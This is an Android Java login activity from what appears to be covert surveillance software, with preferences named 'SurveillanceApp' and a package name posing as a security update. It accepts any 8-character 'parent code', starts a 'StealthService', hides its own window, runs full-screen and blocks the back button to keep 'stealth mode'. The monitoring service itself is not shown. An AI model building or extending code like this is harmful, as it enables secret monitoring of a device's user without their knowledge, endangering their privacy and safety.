package com.security.update;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make window stealthy - no title, no status bar
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_login);
        
        // Check if already logged in
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        
        if (!savedCode.isEmpty()) {
            // Already have code, go to stealth mode directly
            startStealthMode(savedCode);
            return;
        }
        
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        
        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            
            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka code!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (code.length() != 8) {
                Toast.makeText(this, "Code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Accept any 8-character code for now (bypass server verification)
            saveCodeAndEnterStealth(code);
        });
    }
    
    private void saveCodeAndEnterStealth(String code) {
        // Save to shared preferences
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putBoolean("stealth_mode", true);
        editor.apply();
        
        Toast.makeText(this, "✅ Stealth mode imeshashtakiwa!", Toast.LENGTH_LONG).show();
        
        // Enter stealth mode
        startStealthMode(code);
    }
    
    private void startStealthMode(String code) {
        // Start stealth service
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);
        
        // Hide this activity
        moveTaskToBack(true);
        finish();
    }
    
    @Override
    public void onBackPressed() {
        // Prevent going back - force stealth mode
        moveTaskToBack(true);
    }
}
